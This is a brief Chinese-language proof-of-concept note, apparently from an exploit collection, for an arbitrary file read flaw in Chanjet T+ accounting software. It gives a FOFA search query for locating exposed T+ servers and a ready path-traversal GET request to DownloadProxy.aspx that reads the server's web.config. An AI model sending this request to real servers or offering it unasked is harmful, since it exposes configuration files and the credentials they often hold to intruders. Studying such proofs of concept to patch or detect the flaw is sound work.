# 畅捷通T+ 任意文件读取漏洞
## 资产搜索
fofa app="畅捷通-TPlus"
![](img/T+.png)
## POC
### 请求验证码
`GET /tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../web.config`  
![](img/T+POC.png)